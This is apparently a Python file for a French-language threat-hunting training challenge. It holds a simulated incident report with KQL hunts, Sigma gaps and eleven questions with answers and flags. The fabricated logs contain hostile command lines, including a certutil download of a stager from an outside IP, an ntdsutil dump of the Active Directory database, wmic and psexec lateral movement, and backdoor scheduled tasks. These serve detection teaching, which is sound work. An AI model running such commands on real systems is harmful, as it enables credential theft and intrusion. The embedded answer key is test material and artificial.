"""
Challenge 17 — Threat Hunting Proactif
Niveau : 5 (Threat Hunter)
Catégorie : Threat Hunting
"""

ARTIFACT_HUNT = r"""
========== DOSSIER THREAT HUNTING — Session post-incident ==========
Analyste Lead : Équipe SOC RedPawn
Date : 19/02/2026
Objectif : Identifier les gaps de détection et traquer les menaces résiduelles

===== HYPOTHÈSE DE CHASSE #1 : Persistance non détectée =====

Requête KQL (Microsoft Sentinel) :
  DeviceRegistryEvents
  | where Timestamp > ago(30d)
  | where ActionType in ("RegistryValueSet", "RegistryKeyCreated")
  | where RegistryKey has_any ("Run", "RunOnce", "Services", "Winlogon",
          "Shell", "UserInit", "AppInit_DLLs", "Image File Execution")
  | where InitiatingProcessAccountName !in ("SYSTEM", "LOCAL SERVICE")
  | where InitiatingProcessFileName !in ("svchost.exe", "services.exe",
          "csrss.exe", "msiexec.exe", "setup.exe")
  | project Timestamp, DeviceName, RegistryKey, RegistryValueName,
            RegistryValueData, InitiatingProcessFileName,
            InitiatingProcessAccountName
  | sort by Timestamp desc

Résultats (7 entrées) :

TIMESTAMP              DEVICE              KEY                                          VALUE_NAME        VALUE_DATA                           PROCESS           USER
2026-02-18 12:05:11    SRV-DC-01          HKLM\...\Run                                 WinDefUpdate      C:\Windows\Temp\health_check.exe     reg.exe           svc-backup
2026-02-18 12:04:55    SRV-DC-01          HKLM\...\Services\WinDefHealthCheck           ImagePath         C:\Windows\Temp\health_check.exe     sc.exe            svc-backup
2026-02-17 15:30:22    WKS-COMPTA-PC03    HKCU\...\Run                                 GoogleUpdate      C:\Users\j.martin\AppData\...        powershell.exe    j.martin
2026-02-15 09:12:00    WKS-IT-PC01        HKLM\...\Run                                 TeamViewer        C:\Program Files\TeamViewer\...       msiexec.exe       admin.local
2026-02-14 11:45:33    SRV-FILE-01        HKLM\...\Services\BackupAgent                ImagePath         C:\Program Files\BackupSoft\...       services.exe      SYSTEM
2026-02-10 16:20:00    WKS-HR-PC02        HKCU\...\Run                                 OneDrive          %LOCALAPPDATA%\Microsoft\OneDr...    OneDriveSetup.exe m.petit
2026-02-08 10:00:11    SRV-WEB-01         HKLM\...\Run                                 MonitoringAgent   C:\opt\monitoring\agent.exe           ansible.exe       deploy

===== HYPOTHÈSE DE CHASSE #2 : Comptes suspects créés =====

Requête KQL :
  IdentityDirectoryEvents
  | where Timestamp > ago(30d)
  | where ActionType == "Account created"
  | project Timestamp, AccountName, AccountDomain, ActivityType,
            TargetDeviceName, AdditionalFields
  | sort by Timestamp desc

Résultats (4 entrées) :

TIMESTAMP              ACCOUNT_NAME     DOMAIN         TARGET_DEVICE    ADDITIONAL_INFO
2026-02-18 13:15:00    support_it       REDPAWN        SRV-DC-01       MemberOf: Domain Admins, Remote Desktop Users
2026-02-18 06:30:00    svc-monitoring   REDPAWN        SRV-DC-01       MemberOf: Domain Users
2026-02-15 14:00:00    n.bernard        REDPAWN        SRV-DC-01       MemberOf: Domain Users, Comptabilité
2026-02-10 09:00:00    stagiaire.2026   REDPAWN        SRV-DC-01       MemberOf: Domain Users, Stagiaires

===== HYPOTHÈSE DE CHASSE #3 : Exécution suspecte de LOLBins =====

Requête KQL :
  DeviceProcessEvents
  | where Timestamp between (datetime(2026-02-17) .. datetime(2026-02-19))
  | where FileName in~ ("certutil.exe", "bitsadmin.exe", "mshta.exe",
          "regsvr32.exe", "rundll32.exe", "wmic.exe", "cmstp.exe",
          "msbuild.exe", "installutil.exe", "cscript.exe", "wscript.exe",
          "powershell.exe", "cmd.exe", "ntdsutil.exe", "dsquery.exe",
          "csvde.exe", "ldifde.exe", "psexec.exe", "procdump.exe")
  | where InitiatingProcessFileName != "services.exe"
  | project Timestamp, DeviceName, FileName, ProcessCommandLine,
            InitiatingProcessFileName, AccountName
  | sort by Timestamp

Résultats pertinents (filtrés) :

TIMESTAMP              DEVICE              LOLBIN           COMMAND_LINE                                                           PARENT           USER
2026-02-17 15:28:11    WKS-COMPTA-PC03    powershell.exe   powershell -ep bypass -w hidden -e SQBFAFgA...                         excel.exe        j.martin
2026-02-17 15:30:15    WKS-COMPTA-PC03    certutil.exe     certutil -urlcache -split -f http://185.234.72.19/stager.ps1            cmd.exe          j.martin
2026-02-18 09:30:00    WKS-COMPTA-PC03    wmic.exe         wmic /node:"SRV-DC-01" process call create "cmd /c whoami"              cmd.exe          svc-backup
2026-02-18 10:16:02    SRV-DC-01          psexec.exe       psexec \\SRV-FILE-01 -u REDPAWN\svc-backup -p *** -c health_check.exe   cmd.exe          svc-backup
2026-02-18 11:00:33    SRV-DC-01          ntdsutil.exe     ntdsutil "ac i ntds" "ifm" "create full C:\Temp\ntds_dump" q q           cmd.exe          svc-backup
2026-02-18 12:30:00    SRV-DC-01          csvde.exe        csvde -f C:\Temp\ad_export.csv -d "DC=redpawn,DC=local"                  cmd.exe          svc-backup
2026-02-18 13:00:00    WKS-COMPTA-PC03    rundll32.exe     rundll32 C:\Users\j.martin\AppData\Local\Temp\d3d11.dll,DllMain          explorer.exe     j.martin

===== HYPOTHÈSE DE CHASSE #4 : Connexions réseau anormales =====

Requête KQL :
  DeviceNetworkEvents
  | where Timestamp between (datetime(2026-02-17) .. datetime(2026-02-19))
  | where RemoteIPType == "Public"
  | where RemotePort in (443, 8443, 80, 8080, 4444, 1337, 9001)
  | where InitiatingProcessFileName !in ("chrome.exe", "firefox.exe",
          "msedge.exe", "Teams.exe", "Outlook.exe", "OneDrive.exe",
          "MsMpEng.exe", "svchost.exe")
  | summarize ConnectionCount = count(), BytesSent = sum(SentBytes),
              BytesReceived = sum(ReceivedBytes),
              DistinctPorts = dcount(RemotePort)
              by RemoteIP, InitiatingProcessFileName, DeviceName
  | where ConnectionCount > 5
  | sort by ConnectionCount desc

Résultats :

REMOTE_IP          PROCESS              DEVICE              COUNT   BYTES_SENT     BYTES_RECV    PORTS
185.234.72.19      RuntimeBroker.exe    WKS-COMPTA-PC03     847     12,456,789     8,234,567     2 (443, 8443)
185.234.72.19      svchost.exe          SRV-DC-01           234     3,456,789      2,345,678     2 (443, 8443)
91.234.56.78       svchost.exe          WKS-COMPTA-PC03     18      15,892,345     512,456       1 (80)
91.234.56.78       cmd.exe              SRV-DC-01           3       45,678         23,456        1 (80)

===== HYPOTHÈSE DE CHASSE #5 : Tâches planifiées suspectes =====

Requête KQL :
  DeviceRegistryEvents
  | where Timestamp > ago(30d)
  | where RegistryKey has "Schedule\\TaskCache\\Tasks"
  | where ActionType == "RegistryKeyCreated"
  | join kind=inner (
      DeviceProcessEvents
      | where FileName == "schtasks.exe"
    ) on DeviceId, Timestamp
  | project Timestamp, DeviceName, ProcessCommandLine

Résultats (3 entrées) :

TIMESTAMP              DEVICE              COMMAND_LINE
2026-02-18 12:05:30    SRV-DC-01          schtasks /create /tn "WinDefUpdate" /tr "C:\Windows\Temp\health_check.exe" /sc ONSTART /ru SYSTEM
2026-02-18 12:06:00    SRV-DC-01          schtasks /create /tn "SystemHealthReport" /tr "powershell -ep bypass -f C:\ProgramData\report.ps1" /sc DAILY /st 02:00 /ru SYSTEM
2026-02-15 10:00:00    SRV-BACKUP-01      schtasks /create /tn "DailyBackup" /tr "C:\BackupSoft\backup.bat" /sc DAILY /st 23:00 /ru svc-backup

===== SIGMA RULES — GAPS IDENTIFIÉS =====

Règle Sigma existante qui aurait dû matcher :
  title: Certutil Download
  logsource: windows/process_creation
  detection:
    selection:
      Image|endswith: '\certutil.exe'
      CommandLine|contains|all:
        - 'urlcache'
        - '-f'
    condition: selection
  STATUS: DÉSACTIVÉE

Règle Sigma MANQUANTE (à créer) :
  title: WMIC Remote Process Creation
  → Aucune règle ne couvre wmic /node process call create
  
Règle Sigma MANQUANTE (à créer) :
  title: RuntimeBroker External Connection
  → Aucune règle ne surveille les connexions sortantes de RuntimeBroker.exe

===== BILAN DES GAPS DE DÉTECTION =====
1. Règle Certutil DÉSACTIVÉE — a permis le téléchargement du stager
2. Pas de règle sur WMIC remote — a permis la reconnaissance
3. Pas de règle sur RuntimeBroker network — C2 non détecté pendant 6h
4. Pas de règle sur la création de services suspects — persistence non alertée
5. Pas de monitoring des tâches planifiées SYSTEM — 2 backdoors invisibles
6. Pas de baseline des connexions RDP internes — mouvement latéral non vu
"""

CHALLENGE = {
    "id": "c17_threat_hunting",
    "title": "🎯 La Chasse est Ouverte",
    "category": "threat_hunting",
    "level": 5,
    "points_total": 550,
    "estimated_time": "45-65 min",
    "story": """
## Briefing de Mission

**Date :** 19 février 2026, 14h00
**Priorité :** HAUTE
**Source :** SOC Lead / Threat Hunting Team

---

Le jour après l'incident, l'équipe Threat Hunting lance une session proactive pour identifier tous les gaps de détection qui ont permis à l'attaque de progresser sans être détectée.

> *"On a contenu l'attaque mais on doit comprendre POURQUOI notre SOC n'a rien vu pendant 24h. Je veux un audit complet de nos règles de détection. Quels LOLBins sont passés entre les mailles ? Quelles persistances n'ont pas été alertées ? Où sont les trous dans notre couverture ?"*

Threat hunting et detection engineering avancés. Montrez que vous savez penser en attaquant pour mieux défendre.
    """,
    "artifacts": [
        {
            "name": "threat_hunt_report.txt",
            "type": "report",
            "content": ARTIFACT_HUNT,
            "description": "Dossier Threat Hunting — Session post-incident"
        }
    ],
    "questions": [
        {
            "id": "q1",
            "text": "Combien de mécanismes de persistance dans le registre (Hypothèse #1) sont MALVEILLANTS ?",
            "answer": "3",
            "flag": "REDPAWN{3}",
            "points": 40,
            "hints": [
                "Analysez chaque entrée : qui l'a créée, quel binaire, quel chemin ?",
                "Les logiciels légitimes sont installés dans Program Files, pas dans Temp ou AppData"
            ],
            "hint_cost": 13
        },
        {
            "id": "q2",
            "text": "Quel LOLBin utilisé pour télécharger le stager avait sa règle Sigma DÉSACTIVÉE ?",
            "answer": "certutil.exe",
            "flag": "REDPAWN{certutil}",
            "points": 50,
            "hints": [
                "Regardez la section Sigma Rules — Gaps Identifiés",
                "C'est un outil Windows légitime utilisé pour télécharger des fichiers"
            ],
            "hint_cost": 17
        },
        {
            "id": "q3",
            "text": "Quel processus légitime a été abusé comme parent pour lancer le PowerShell initial (le premier LOLBin de la liste) ?",
            "answer": "excel.exe",
            "flag": "REDPAWN{excel.exe}",
            "points": 50,
            "hints": [
                "Regardez le parent du premier powershell.exe dans l'Hypothèse #3",
                "C'est l'application qui a ouvert la pièce jointe piégée"
            ],
            "hint_cost": 17
        },
        {
            "id": "q4",
            "text": "Combien de bytes (arrondis au MB) ont été exfiltrés via le processus svchost.exe vers 91.234.56.78 ?",
            "answer": "16",
            "flag": "REDPAWN{16}",
            "points": 40,
            "hints": [
                "Regardez l'Hypothèse #4 — la ligne 91.234.56.78 + svchost",
                "15,892,345 bytes ≈ 16 MB (arrondi)"
            ],
            "hint_cost": 13
        },
        {
            "id": "q5",
            "text": "Quel outil a été exécuté pour exporter l'annuaire Active Directory en CSV ?",
            "answer": "csvde.exe",
            "flag": "REDPAWN{csvde}",
            "points": 50,
            "hints": [
                "Regardez les LOLBins dans l'Hypothèse #3",
                "C'est un outil natif Windows pour exporter/importer depuis AD"
            ],
            "hint_cost": 17
        },
        {
            "id": "q6",
            "text": "Quel compte créé pendant la fenêtre d'attaque nécessite une investigation complémentaire (ni clairement malveillant ni clairement légitime) ?",
            "answer": "svc-monitoring",
            "flag": "REDPAWN{svc-monitoring}",
            "points": 40,
            "hints": [
                "Analysez les dates de création et les groupes de chaque compte",
                "Un compte de service créé le 18/02 sans appartenance suspecte reste ambigu"
            ],
            "hint_cost": 13
        },
        {
            "id": "q7",
            "text": "Combien de gaps de détection au total sont identifiés dans le bilan final ?",
            "answer": "6",
            "flag": "REDPAWN{6}",
            "points": 30,
            "hints": [
                "Comptez dans la section 'Bilan des gaps de détection'"
            ],
            "hint_cost": 10
        },
        {
            "id": "q8",
            "text": "À quelle heure la tâche planifiée malveillante 'SystemHealthReport' est-elle programmée ? (format HH:MM)",
            "answer": "02:00",
            "flag": "REDPAWN{02:00}",
            "points": 40,
            "hints": [
                "Regardez l'Hypothèse #5 — les tâches planifiées",
                "C'est une heure de nuit pour éviter la détection"
            ],
            "hint_cost": 13
        },
        {
            "id": "q9",
            "text": "Quel processus établit 847 connexions vers le C2, ce qui ne correspond pas à son comportement normal ?",
            "answer": "RuntimeBroker.exe",
            "flag": "REDPAWN{RuntimeBroker.exe}",
            "points": 40,
            "hints": [
                "Regardez l'Hypothèse #4 — le processus avec le plus de connexions",
                "C'est un processus Windows légitime détourné par injection"
            ],
            "hint_cost": 13
        },
        {
            "id": "q10",
            "text": "Quel LOLBin est utilisé avec '/node' pour exécuter des commandes à distance, sans aucune règle de détection ?",
            "answer": "wmic.exe",
            "flag": "REDPAWN{wmic}",
            "points": 50,
            "hints": [
                "Regardez les règles Sigma manquantes et l'Hypothèse #3",
                "Windows Management Instrumentation Command-line"
            ],
            "hint_cost": 17
        },
        {
            "id": "q11",
            "text": "Quelle commande ntdsutil extrait une copie complète de la base Active Directory ?",
            "answer": "create full",
            "flag": "REDPAWN{create_full}",
            "points": 60,
            "hints": [
                "Regardez la ligne ntdsutil dans l'Hypothèse #3",
                "IFM = Install From Media, puis 'create full' pour un dump complet"
            ],
            "hint_cost": 20
        }
    ]
}
